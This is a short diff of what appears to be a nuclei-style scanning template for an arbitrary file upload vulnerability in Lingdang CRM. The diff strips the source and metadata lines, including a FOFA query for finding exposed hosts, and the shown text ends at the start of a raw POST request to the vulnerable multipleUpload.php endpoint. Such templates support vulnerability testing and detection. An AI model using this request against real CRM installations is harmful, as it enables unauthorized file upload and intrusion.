@@ -3,12 +3,8 @@ info:
   name: 灵当CRM客户管理系统multipleupload 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/si6idxxee3vfnqno'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: si6idxxee3vfnqno
-    fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js"
 http:
 - raw:
   - 'POST /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1 HTTP/1.1
